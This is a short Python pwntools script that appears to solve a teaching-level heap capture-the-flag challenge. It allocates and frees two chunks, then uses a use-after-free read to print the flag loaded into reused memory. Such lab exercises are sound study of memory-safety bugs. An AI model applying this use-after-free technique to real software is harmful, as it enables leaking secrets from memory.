from pwn import *
p = process('/babyheap_level3_teaching1')
# allocate 768 bytes at index 0 and index 1
p.send(b'malloc\n0\n746\n')
p.send(b'malloc\n1\n746\n')
# free them both
p.send(b'free\n1\nfree\n0\n')
# read in the flag and print it out from
# the second buffer
p.send(b'read_flag\n')
p.clean()
p.send(b'puts\n1\n')
p.recvline()
log.info(p.recvline().decode('utf-8'))
p.close()